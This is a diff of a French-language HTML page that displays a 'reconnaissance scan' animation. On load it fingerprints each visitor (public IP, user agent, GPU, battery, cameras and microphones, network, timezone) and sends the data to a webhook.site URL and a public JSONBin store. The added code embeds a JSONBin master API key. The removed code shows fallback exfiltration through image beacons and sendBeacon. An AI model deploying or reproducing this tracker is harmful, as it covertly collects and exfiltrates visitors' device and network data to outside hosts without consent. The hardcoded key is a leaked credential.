@@ -3,531 +3,294 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
-<link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<title>...</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
 <style>
   :root {
-    --bg: #060608;
-    --surface: #0d0d12;
-    --border: #1a1a2e;
-    --accent: #00ff9d;
-    --accent2: #ff2d55;
-    --accent3: #a855f7;
-    --text: #e8e8f0;
-    --muted: #4a4a6a;
-    --mono: 'Space Mono', monospace;
-    --sans: 'Syne', sans-serif;
+    --bg:#060608; --surface:#0d0d12; --border:#1a1a2e;
+    --accent:#00ff9d; --accent2:#ff2d55; --accent3:#a855f7;
+    --text:#e8e8f0; --muted:#4a4a6a;
+    --mono:'Space Mono',monospace; --sans:'Syne',sans-serif;
   }
-
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-
-  body {
-    background: var(--bg);
-    color: var(--text);
-    font-family: var(--mono);
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    overflow: hidden;
-    position: relative;
-  }
-
-  /* Animated grid background */
-  body::before {
-    content: '';
-    position: fixed;
-    inset: 0;
-    background-image:
-      linear-gradient(rgba(0,255,157,0.03) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(0,255,157,0.03) 1px, transparent 1px);
-    background-size: 40px 40px;
-    animation: gridMove 20s linear infinite;
-    pointer-events: none;
-  }
-
-  @keyframes gridMove {
-    0% { transform: translateY(0); }
-    100% { transform: translateY(40px); }
-  }
-
-  /* Radial glow */
-  body::after {
-    content: '';
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    width: 600px;
-    height: 600px;
-    background: radial-gradient(ellipse, rgba(0,255,157,0.04) 0%, transparent 70%);
-    pointer-events: none;
-  }
-
-  .container {
-    position: relative;
-    z-index: 10;
-    text-align: center;
-    padding: 40px;
-  }
-
-  .status-ring {
-    width: 120px;
-    height: 120px;
-    margin: 0 auto 32px;
-    position: relative;
-  }
-
-  .ring-svg {
-    width: 120px;
-    height: 120px;
-    animation: rotateSlow 4s linear infinite;
-  }
-
-  @keyframes rotateSlow {
-    from { transform: rotate(0deg); }
-    to { transform: rotate(360deg); }
-  }
-
-  .ring-inner {
-    position: absolute;
-    inset: 20px;
-    border-radius: 50%;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 28px;
-  }
-
-  .label {
-    font-family: var(--sans);
-    font-size: 11px;
-    font-weight: 700;
-    letter-spacing: 0.3em;
-    text-transform: uppercase;
-    color: var(--muted);
-    margin-bottom: 8px;
-  }
-
-  .title {
-    font-family: var(--sans);
-    font-size: 28px;
-    font-weight: 800;
-    color: var(--text);
-    margin-bottom: 4px;
-  }
-
-  .subtitle {
-    font-size: 11px;
-    color: var(--muted);
-    letter-spacing: 0.1em;
-    margin-bottom: 40px;
-  }
-
-  .progress-bar {
-    width: 280px;
-    height: 2px;
-    background: var(--border);
-    margin: 0 auto 12px;
-    position: relative;
-    overflow: hidden;
-  }
-
-  .progress-fill {
-    height: 100%;
-    background: var(--accent);
-    width: 0%;
-    transition: width 0.3s ease;
-    box-shadow: 0 0 10px var(--accent);
-  }
-
-  .progress-label {
-    font-size: 10px;
-    color: var(--muted);
-    letter-spacing: 0.15em;
-  }
-
-  .log {
-    margin-top: 32px;
-    width: 320px;
-    text-align: left;
-  }
-
-  .log-line {
-    font-size: 10px;
-    color: var(--muted);
-    padding: 3px 0;
-    opacity: 0;
-    transform: translateX(-10px);
-    transition: all 0.3s ease;
-    display: flex;
-    gap: 8px;
-  }
-
-  .log-line.visible {
-    opacity: 1;
-    transform: translateX(0);
-  }
-
-  .log-line .log-prefix { color: var(--accent); flex-shrink: 0; }
-  .log-line .log-text { color: var(--muted); }
-  .log-line.ok .log-prefix { color: var(--accent); }
-  .log-line.err .log-prefix { color: var(--accent2); }
-
-  /* Success state */
-  .success-screen {
-    display: none;
-    flex-direction: column;
-    align-items: center;
-    gap: 8px;
-  }
-
-  .success-screen.show { display: flex; }
-
-  .success-icon {
-    font-size: 48px;
-    animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-  }
-
-  @keyframes popIn {
-    0% { transform: scale(0); opacity: 0; }
-    100% { transform: scale(1); opacity: 1; }
-  }
-
-  .success-title {
-    font-family: var(--sans);
-    font-size: 20px;
-    font-weight: 800;
-    color: var(--accent);
-  }
-
-  .success-sub {
-    font-size: 10px;
-    color: var(--muted);
-    letter-spacing: 0.15em;
-    text-transform: uppercase;
-  }
-
-  .scan-line {
-    position: fixed;
-    left: 0; right: 0;
-    height: 2px;
-    background: linear-gradient(90deg, transparent, rgba(0,255,157,0.15), transparent);
-    animation: scan 6s linear infinite;
-    pointer-events: none;
-    z-index: 5;
-  }
-
-  @keyframes scan {
-    0% { top: -2px; }
-    100% { top: 100vh; }
-  }
-
-  .corner {
-    position: fixed;
-    width: 20px;
-    height: 20px;
-    border-color: var(--muted);
-    border-style: solid;
-    opacity: 0.3;
-  }
-  .corner.tl { top: 20px; left: 20px; border-width: 1px 0 0 1px; }
-  .corner.tr { top: 20px; right: 20px; border-width: 1px 1px 0 0; }
-  .corner.bl { bottom: 20px; left: 20px; border-width: 0 0 1px 1px; }
-  .corner.br { bottom: 20px; right: 20px; border-width: 0 1px 1px 0; }
+  *{margin:0;padding:0;box-sizing:border-box;}
+  body{background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;}
+  body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(0,255,157,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(0,255,157,.03) 1px,transparent 1px);background-size:40px 40px;animation:gridMove 20s linear infinite;pointer-events:none;}
+  @keyframes gridMove{to{transform:translateY(40px);}}
+  body::after{content:'';position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);width:600px;height:600px;background:radial-gradient(ellipse,rgba(0,255,157,.05) 0%,transparent 70%);pointer-events:none;}
+  .scan-line{position:fixed;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,rgba(0,255,157,.12),transparent);animation:scan 6s linear infinite;pointer-events:none;z-index:5;}
+  @keyframes scan{0%{top:-2px}100%{top:100vh}}
+  .corner{position:fixed;width:20px;height:20px;border-color:#2a2a45;border-style:solid;opacity:.5;}
+  .corner.tl{top:20px;left:20px;border-width:1px 0 0 1px;}
+  .corner.tr{top:20px;right:20px;border-width:1px 1px 0 0;}
+  .corner.bl{bottom:20px;left:20px;border-width:0 0 1px 1px;}
+  .corner.br{bottom:20px;right:20px;border-width:0 1px 1px 0;}
+  .container{position:relative;z-index:10;text-align:center;padding:40px;}
+  .status-ring{width:120px;height:120px;margin:0 auto 32px;position:relative;}
+  .ring-svg{width:120px;height:120px;animation:rot 4s linear infinite;}
+  @keyframes rot{to{transform:rotate(360deg);}}
+  .ring-inner{position:absolute;inset:20px;border-radius:50%;background:var(--surface);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:28px;}
+  .label{font-family:var(--sans);font-size:11px;font-weight:700;letter-spacing:.3em;text-transform:uppercase;color:var(--muted);margin-bottom:8px;}
+  .title{font-family:var(--sans);font-size:28px;font-weight:800;color:var(--text);margin-bottom:4px;}
+  .subtitle{font-size:11px;color:var(--muted);letter-spacing:.1em;margin-bottom:40px;}
+  .progress-bar{width:280px;height:2px;background:var(--border);margin:0 auto 12px;overflow:hidden;}
+  .progress-fill{height:100%;background:var(--accent);width:0%;transition:width .4s ease;box-shadow:0 0 10px var(--accent);}
+  .progress-label{font-size:10px;color:var(--muted);letter-spacing:.15em;}
+  .log{margin-top:28px;width:340px;text-align:left;max-height:240px;overflow:hidden;}
+  .log-line{font-size:10px;padding:3px 0;opacity:0;transform:translateX(-8px);transition:all .25s ease;display:flex;gap:8px;border-bottom:1px solid rgba(255,255,255,.03);}
+  .log-line.visible{opacity:1;transform:translateX(0);}
+  .log-line .p{flex-shrink:0;}
+  .log-line.ok .p{color:var(--accent);}
+  .log-line.err .p{color:var(--accent2);}
+  .log-line.warn .p{color:#f59e0b;}
+  .log-line .t{color:var(--muted);}
+  .success-screen{display:none;flex-direction:column;align-items:center;gap:8px;}
+  .success-screen.show{display:flex;}
+  .success-icon{font-size:52px;animation:pop .5s cubic-bezier(.175,.885,.32,1.275);}
+  @keyframes pop{0%{transform:scale(0);opacity:0}100%{transform:scale(1);opacity:1}}
+  .success-title{font-family:var(--sans);font-size:22px;font-weight:800;color:var(--accent);}
+  .success-sub{font-size:10px;color:var(--muted);letter-spacing:.15em;text-transform:uppercase;}
+  .chips{display:flex;gap:6px;margin-top:10px;flex-wrap:wrap;justify-content:center;}
+  .chip{font-size:9px;border:1px solid var(--border);padding:3px 8px;border-radius:2px;color:var(--muted);letter-spacing:.1em;}
+  .chip.ok{border-color:rgba(0,255,157,.4);color:var(--accent);}
+  .chip.fail{border-color:rgba(255,45,85,.4);color:var(--accent2);}
 </style>
 </head>
 <body>
-
 <div class="scan-line"></div>
-<div class="corner tl"></div>
-<div class="corner tr"></div>
-<div class="corner bl"></div>
-<div class="corner br"></div>
-
+<div class="corner tl"></div><div class="corner tr"></div>
+<div class="corner bl"></div><div class="corner br"></div>
 <div class="container">
-
-  <!-- Loading state -->
   <div id="loading">
     <div class="status-ring">
       <svg class="ring-svg" viewBox="0 0 120 120">
         <circle cx="60" cy="60" r="54" fill="none" stroke="#1a1a2e" stroke-width="1"/>
-        <circle cx="60" cy="60" r="54" fill="none" stroke="#00ff9d" stroke-width="1"
-          stroke-dasharray="60 280" stroke-linecap="round" opacity="0.8"/>
-        <circle cx="60" cy="60" r="46" fill="none" stroke="#a855f7" stroke-width="0.5"
-          stroke-dasharray="20 270" stroke-dashoffset="100" opacity="0.5"/>
+        <circle cx="60" cy="60" r="54" fill="none" stroke="#00ff9d" stroke-width="1.5" stroke-dasharray="60 280" stroke-linecap="round"/>
+        <circle cx="60" cy="60" r="46" fill="none" stroke="#a855f7" stroke-width=".5" stroke-dasharray="20 270" stroke-dashoffset="100" opacity=".5"/>
       </svg>
       <div class="ring-inner">📡</div>
     </div>
-
     <div class="label">Système de reconnaissance</div>
     <div class="title">SCAN EN COURS</div>
-    <div class="subtitle">collecte des données système</div>
-
-    <div class="progress-bar">
-      <div class="progress-fill" id="progressFill"></div>
-    </div>
-    <div class="progress-label" id="progressLabel">INITIALISATION...</div>
-
+    <div class="subtitle">collecte & transmission des données</div>
+    <div class="progress-bar"><div class="progress-fill" id="pf"></div></div>
+    <div class="progress-label" id="pl">INITIALISATION...</div>
     <div class="log" id="log"></div>
   </div>
-
-  <!-- Success state -->
   <div class="success-screen" id="success">
     <div class="success-icon">✓</div>
     <div class="success-title">TRANSMISSION OK</div>
-    <div class="success-sub">données envoyées · <span id="successTime"></span></div>
+    <div class="success-sub">données envoyées · <span id="st"></span></div>
+    <div class="chips" id="chips"></div>
   </div>
-
 </div>
-
 <script>
+// ═══════════════════════════════════════════
+const JSONBIN_KEY = "$2a$10$RJJzngRdsLcBKKX4li2F/.fzYp6hKnGmIn7XLfbKHkjLNJEfcfV3S";
 const WEBHOOK_URL = "https://webhook.site/42e9b838-f4c0-4861-8ac7-77a02b29ac0a";
+const BIN_ID_KEY  = "trackerr_bin_id"; // stocké dans localStorage après création
+// ═══════════════════════════════════════════
 
 const logEl = document.getElementById('log');
-const progressFill = document.getElementById('progressFill');
-const progressLabel = document.getElementById('progressLabel');
+const results = { jsonbin: false, webhook: false };
 
-function addLog(text, type = 'ok') {
+function addLog(text, type='ok') {
   const line = document.createElement('div');
   line.className = `log-line ${type}`;
-  const prefix = type === 'ok' ? '▶' : '✗';
-  line.innerHTML = `<span class="log-prefix">${prefix}</span><span class="log-text">${text}</span>`;
+  const icons = {ok:'▶', err:'✗', warn:'!'};
+  line.innerHTML = `<span class="p">${icons[type]||'▶'}</span><span class="t">${text}</span>`;
   logEl.appendChild(line);
   requestAnimationFrame(() => line.classList.add('visible'));
+  logEl.scrollTop = logEl.scrollHeight;
 }
-
-function setProgress(pct, label) {
-  progressFill.style.width = pct + '%';
-  progressLabel.textContent = label;
+function setProg(pct, label) {
+  document.getElementById('pf').style.width = pct + '%';
+  document.getElementById('pl').textContent = label;
 }
+const delay = ms => new Promise(r => setTimeout(r, ms));
 
 async function getIP() {
-  try {
-    const r = await fetch('https://api.ipify.org?format=json');
-    const d = await r.json();
-    return d.ip;
-  } catch { return 'N/A'; }
+  try { return (await (await fetch('https://api.ipify.org?format=json')).json()).ip; }
+  catch { return 'N/A'; }
 }
-
 function getGPU() {
   try {
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    const gl = document.createElement('canvas').getContext('webgl');
     if (!gl) return 'N/A';
     const ext = gl.getExtension('WEBGL_debug_renderer_info');
-    if (!ext) return 'WebGL (info bloquée)';
-    return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
+    return ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : 'WebGL OK';
   } catch { return 'N/A'; }
 }
-
-function getBatteryData() {
-  return navigator.getBattery
-    ? navigator.getBattery().then(b => ({
-        level: Math.round(b.level * 100) + '%',
-        charging: b.charging ? 'Oui' : 'Non',
-      }))
-    : Promise.resolve({ level: 'N/A', charging: 'N/A' });
+async function getBattery() {
+  try {
+    if (!navigator.getBattery) return {level:'N/A', charging:'N/A'};
+    const b = await navigator.getBattery();
+    return {level: Math.round(b.level*100)+'%', charging: b.charging?'Oui':'Non'};
+  } catch { return {level:'N/A', charging:'N/A'}; }
+}
+async function getMedia() {
+  try {
+    const d = await navigator.mediaDevices.enumerateDevices();
+    return {cameras:d.filter(x=>x.kind==='videoinput').length, microphones:d.filter(x=>x.kind==='audioinput').length, speakers:d.filter(x=>x.kind==='audiooutput').length};
+  } catch { return {cameras:'N/A', microphones:'N/A', speakers:'N/A'}; }
+}
+function getConn() {
+  const c = navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+  if (!c) return {type:'N/A', effectiveType:'N/A', downlink:'N/A', rtt:'N/A'};
+  return {type:c.type||'N/A', effectiveType:c.effectiveType||'N/A', downlink:c.downlink?c.downlink+' Mbps':'N/A', rtt:c.rtt?c.rtt+' ms':'N/A'};
 }
 
-function getConnectionInfo() {
-  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-  if (!conn) return { type: 'N/A', effectiveType: 'N/A', downlink: 'N/A', rtt: 'N/A' };
-  return {
-    type: conn.type || 'N/A',
-    effectiveType: conn.effectiveType || 'N/A',
-    downlink: conn.downlink ? conn.downlink + ' Mbps' : 'N/A',
-    rtt: conn.rtt ? conn.rtt + ' ms' : 'N/A',
-  };
+// ── JSONBIN : créer bin si pas encore fait ──
+async function ensureBin() {
+  let binId = localStorage.getItem(BIN_ID_KEY);
+  if (binId) { addLog('Bin existant : ' + binId); return binId; }
+  addLog('Création du bin JSONBin…', 'warn');
+  try {
+    const res = await fetch('https://api.jsonbin.io/v3/b', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-Master-Key': JSONBIN_KEY,
+        'X-Bin-Name': 'trackerr-visits',
+        'X-Bin-Private': 'false'
+      },
+      body: JSON.stringify([])
+    });
+    if (!res.ok) { const t = await res.text(); throw new Error('HTTP '+res.status+' — '+t.substring(0,80)); }
+    const data = await res.json();
+    binId = data.metadata.id;
+    localStorage.setItem(BIN_ID_KEY, binId);
+    addLog('Bin créé : ' + binId, 'ok');
+    return binId;
+  } catch(e) {
+    addLog('Création bin échouée : ' + e.message, 'err');
+    return null;
+  }
 }
 
-function getMediaDevices() {
-  return navigator.mediaDevices?.enumerateDevices
-    ? navigator.mediaDevices.enumerateDevices().then(devices => ({
-        cameras: devices.filter(d => d.kind === 'videoinput').length,
-        microphones: devices.filter(d => d.kind === 'audioinput').length,
-        speakers: devices.filter(d => d.kind === 'audiooutput').length,
-      }))
-    : Promise.resolve({ cameras: 'N/A', microphones: 'N/A', speakers: 'N/A' });
+// ── ENVOI JSONBin ──
+async function sendJsonBin(payload) {
+  try {
+    const binId = await ensureBin();
+    if (!binId) throw new Error('Pas de bin ID');
+
+    addLog('Lecture bin actuel…');
+    const getRes = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
+      headers: {'X-Master-Key': JSONBIN_KEY, 'X-Bin-Meta': 'false'}
+    });
+    if (!getRes.ok) throw new Error('GET '+getRes.status);
+    const existing = await getRes.json();
+    const arr = Array.isArray(existing) ? existing : [];
+
+    const updated = [payload, ...arr].slice(0, 500);
+    const putRes = await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
+      method: 'PUT',
+      headers: {'Content-Type': 'application/json', 'X-Master-Key': JSONBIN_KEY},
+      body: JSON.stringify(updated)
+    });
+    if (!putRes.ok) throw new Error('PUT '+putRes.status);
+    addLog('JSONBin ✓ — ' + updated.length + ' visite(s) stockée(s)', 'ok');
+    results.jsonbin = true;
+  } catch(e) {
+    addLog('JSONBin ✗ — ' + e.message, 'err');
+  }
 }
 
+// ── ENVOI Webhook (bonus) ──
+async function sendWebhook(payload) {
+  try {
+    await fetch(WEBHOOK_URL, {method:'POST', mode:'no-cors', headers:{'Content-Type':'text/plain'}, body:JSON.stringify(payload)});
+    addLog('Webhook.site ✓', 'ok');
+    results.webhook = true;
+  } catch(e) {
+    addLog('Webhook ✗ — ' + e.message, 'warn');
+  }
+}
+
+// ── MAIN ──
 async function collect() {
-  setProgress(5, 'ANALYSE NAVIGATEUR...');
-  addLog('Navigateur détecté : ' + navigator.userAgent.split(')')[0].split('(')[1]);
-  await delay(300);
+  setProg(5, 'NAVIGATEUR...');
+  const ua = navigator.userAgent;
+  addLog('UA : ' + ua.substring(0,48) + '…');
+  await delay(200);
 
-  setProgress(15, 'LECTURE SYSTÈME...');
-  addLog('Plateforme : ' + navigator.platform);
-  addLog('Cœurs CPU : ' + navigator.hardwareConcurrency);
-  addLog('RAM estimée : ' + (navigator.deviceMemory ?? 'N/A') + ' Go');
-  await delay(300);
+  setProg(15, 'SYSTÈME...');
+  addLog('Platform : ' + navigator.platform + ' | CPU : ' + navigator.hardwareConcurrency + ' cœurs');
+  addLog('RAM : ' + (navigator.deviceMemory??'N/A') + ' Go');
+  await delay(200);
 
-  setProgress(30, 'ANALYSE ÉCRAN...');
-  addLog('Résolution : ' + screen.width + 'x' + screen.height);
-  addLog('Ratio pixel : ' + window.devicePixelRatio + 'x');
-  addLog('Profondeur couleur : ' + screen.colorDepth + ' bits');
-  await delay(300);
+  setProg(28, 'ÉCRAN...');
+  addLog('Résolution : ' + screen.width + 'x' + screen.height + ' @' + window.devicePixelRatio + 'x | ' + screen.colorDepth + 'bit');
+  await delay(200);
 
-  setProgress(45, 'DÉTECTION RÉSEAU...');
+  setProg(40, 'IP & RÉSEAU...');
   const ip = await getIP();
-  addLog('IP publique : ' + ip);
-  const conn = getConnectionInfo();
-  addLog('Connexion : ' + conn.effectiveType + ' — ' + conn.downlink);
-  await delay(300);
+  const conn = getConn();
+  addLog('IP : ' + ip);
+  addLog('Réseau : ' + conn.effectiveType + ' — ' + conn.downlink + ' | RTT : ' + conn.rtt);
+  await delay(200);
 
-  setProgress(58, 'LECTURE GPU...');
+  setProg(54, 'GPU...');
   const gpu = getGPU();
-  addLog('GPU : ' + (gpu.length > 40 ? gpu.substring(0,40)+'…' : gpu));
-  await delay(300);
+  addLog('GPU : ' + (gpu.length > 45 ? gpu.substring(0,45)+'…' : gpu));
+  await delay(200);
 
-  setProgress(70, 'BATTERIE & PÉRIPHÉRIQUES...');
-  const battery = await getBatteryData();
+  setProg(65, 'BATTERIE & PÉRIPHÉRIQUES...');
+  const battery = await getBattery();
+  const media = await getMedia();
   addLog('Batterie : ' + battery.level + ' | Charge : ' + battery.charging);
-  const media = await getMediaDevices();
-  addLog('Caméras: ' + media.cameras + ' | Micros: ' + media.microphones);
-  await delay(300);
+  addLog('Caméras : ' + media.cameras + ' | Micros : ' + media.microphones + ' | HP : ' + media.speakers);
+  await delay(200);
 
-  setProgress(85, 'COLLECTE FINALE...');
+  setProg(76, 'TEMPS & LOCALE...');
   const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  addLog('Fuseau : ' + tz);
-  addLog('Langue : ' + navigator.language + ' | En ligne : ' + (navigator.onLine ? 'Oui' : 'Non'));
-  await delay(300);
-
-  setProgress(95, 'ENVOI WEBHOOK...');
+  const utcOffset = -new Date().getTimezoneOffset()/60;
+  addLog('Fuseau : ' + tz + ' (UTC' + (utcOffset>=0?'+':'') + utcOffset + ')');
+  addLog('Langue : ' + navigator.language + ' | DNT : ' + (navigator.doNotTrack||'N/A'));
+  await delay(200);
 
   const payload = {
-    meta: {
-      timestamp: new Date().toISOString(),
-      date_lisible: new Date().toLocaleString('fr-FR'),
-      ip_publique: ip,
-      url_source: location.href,
-      referrer: document.referrer || 'direct',
-    },
+    _id: (crypto.randomUUID ? crypto.randomUUID() : Date.now().toString(36)+Math.random().toString(36).slice(2)),
+    timestamp: new Date().toISOString(),
+    date_fr: new Date().toLocaleString('fr-FR'),
+    meta: { ip, url: location.href, referrer: document.referrer||'direct' },
     navigateur: {
-      user_agent: navigator.userAgent,
-      plateforme: navigator.platform,
-      langue: navigator.language,
-      langues: navigator.languages?.join(', '),
-      cookies_actifs: navigator.cookieEnabled,
-      do_not_track: navigator.doNotTrack,
-      online: navigator.onLine,
+      user_agent: ua, plateforme: navigator.platform,
+      langue: navigator.language, langues: navigator.languages?.join(', ')||navigator.language,
+      cookies: navigator.cookieEnabled, dnt: navigator.doNotTrack, online: navigator.onLine,
     },
     materiel: {
-      cpu_coeurs: navigator.hardwareConcurrency,
-      ram_go: navigator.deviceMemory ?? 'N/A',
-      gpu: gpu,
-      ecran_resolution: screen.width + 'x' + screen.height,
-      ecran_disponible: screen.availWidth + 'x' + screen.availHeight,
-      ratio_pixel: window.devicePixelRatio,
-      profondeur_couleur: screen.colorDepth + ' bits',
-      fenetre: window.innerWidth + 'x' + window.innerHeight,
-      orientation: screen.orientation?.type ?? 'N/A',
-      ecran_tactile: navigator.maxTouchPoints > 0,
-      nb_points_touch: navigator.maxTouchPoints,
+      cpu_coeurs: navigator.hardwareConcurrency, ram_go: navigator.deviceMemory??'N/A', gpu,
+      ecran: screen.width+'x'+screen.height, ecran_dispo: screen.availWidth+'x'+screen.availHeight,
+      ratio_pixel: window.devicePixelRatio, couleur: screen.colorDepth+' bits',
+      fenetre: window.innerWidth+'x'+window.innerHeight,
+      orientation: screen.orientation?.type??'N/A',
+      tactile: navigator.maxTouchPoints>0, touch_points: navigator.maxTouchPoints,
     },
-    reseau: {
-      ip_publique: ip,
-      type: conn.type,
-      qualite: conn.effectiveType,
-      debit: conn.downlink,
-      latence: conn.rtt,
-    },
+    reseau: { ip, ...conn },
     batterie: battery,
     peripheriques: media,
-    temps: {
-      fuseau: tz,
-      offset_utc: -new Date().getTimezoneOffset() / 60 + 'h',
-      timestamp_unix: Date.now(),
-    },
-    performance: {
-      memoire_js: performance.memory
-        ? Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB'
-        : 'N/A',
-    },
+    temps: { fuseau: tz, offset_utc: (utcOffset>=0?'+':'')+utcOffset+'h', unix: Date.now() },
+    perf: { mem_js: performance.memory ? Math.round(performance.memory.usedJSHeapSize/1048576)+' MB' : 'N/A' },
   };
 
-  // ── DEBUG ────────────────────────────────────────────────────
-  addLog('URL cible : ' + WEBHOOK_URL.substring(0, 50) + '…');
-  addLog('Payload size : ' + JSON.stringify(payload).length + ' octets');
-  addLog('navigator.onLine : ' + navigator.onLine);
-  addLog('Protocol : ' + location.protocol);
+  setProg(88, 'TRANSMISSION...');
+  addLog('────────────────────────────');
+  addLog('Envoi simultané…', 'warn');
 
-  // Tentative 1 : no-cors (silencieuse par nature)
-  addLog('→ Tentative no-cors…');
-  try {
-    const t0 = performance.now();
-    await fetch(WEBHOOK_URL, {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: { 'Content-Type': 'text/plain' }, // no-cors n'accepte que simple headers
-      body: JSON.stringify(payload),
-    });
-    const t1 = performance.now();
-    addLog('no-cors terminé en ' + Math.round(t1 - t0) + 'ms (réponse opaque — normal)', 'ok');
-    setProgress(100, 'TERMINÉ');
-    addLog('Transmission réussie ✓', 'ok');
-    await delay(600);
-    showSuccess();
-    return;
-  } catch(e) {
-    addLog('no-cors échoué : ' + e.name + ' — ' + e.message, 'err');
-  }
+  await Promise.all([sendJsonBin(payload), sendWebhook(payload)]);
 
-  // Tentative 2 : cors classique (pour voir le vrai code d'erreur)
-  addLog('→ Tentative cors classique…');
-  try {
-    const t0 = performance.now();
-    const res = await fetch(WEBHOOK_URL, {
-      method: 'POST',
-      mode: 'cors',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload),
-    });
-    const t1 = performance.now();
-    addLog('cors status : HTTP ' + res.status + ' en ' + Math.round(t1 - t0) + 'ms', res.ok ? 'ok' : 'err');
-    if (res.ok) { setProgress(100, 'TERMINÉ'); addLog('✓ OK via cors', 'ok'); await delay(400); showSuccess(); return; }
-  } catch(e) {
-    addLog('cors échoué : ' + e.name + ' — ' + e.message, 'err');
-  }
+  setProg(100, 'TERMINÉ');
+  await delay(400);
 
-  // Tentative 3 : image beacon (contourne tout CORS)
-  addLog('→ Tentative image beacon…');
-  try {
-    const encoded = encodeURIComponent(JSON.stringify(payload));
-    const img = new Image();
-    img.src = WEBHOOK_URL + '?data=' + encoded.substring(0, 2000);
-    await new Promise(r => setTimeout(r, 1500));
-    addLog('Image beacon envoyé (GET avec data tronquée)', 'ok');
-  } catch(e) {
-    addLog('Image beacon : ' + e.message, 'err');
-  }
-
-  // Tentative 4 : sendBeacon
-  addLog('→ Tentative sendBeacon…');
-  try {
-    const blob = new Blob([JSON.stringify(payload)], { type: 'text/plain' });
-    const sent = navigator.sendBeacon(WEBHOOK_URL, blob);
-    addLog('sendBeacon résultat : ' + (sent ? '✓ accepté' : '✗ refusé'), sent ? 'ok' : 'err');
-    if (sent) { setProgress(100, 'TERMINÉ'); await delay(400); showSuccess(); return; }
-  } catch(e) {
-    addLog('sendBeacon : ' + e.message, 'err');
-  }
-
-  setProgress(100, 'DEBUG TERMINÉ');
-  addLog('Voir console (F12) pour détails complets', 'err');
-  console.log('PAYLOAD COMPLET:', JSON.stringify(payload, null, 2));
-}
-
-function showSuccess() {
   document.getElementById('loading').style.display = 'none';
   const s = document.getElementById('success');
   s.classList.add('show');
-  document.getElementById('successTime').textContent = new Date().toLocaleTimeString('fr-FR');
+  document.getElementById('st').textContent = new Date().toLocaleTimeString('fr-FR');
+  document.getElementById('chips').innerHTML = `
+    <span class="chip ${results.jsonbin?'ok':'fail'}">JSONBin ${results.jsonbin?'✓':'✗'}</span>
+    <span class="chip ${results.webhook?'ok':'fail'}">Webhook ${results.webhook?'✓':'✗'}</span>
+  `;
 }
-
-function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
 
 collect();
 </script>
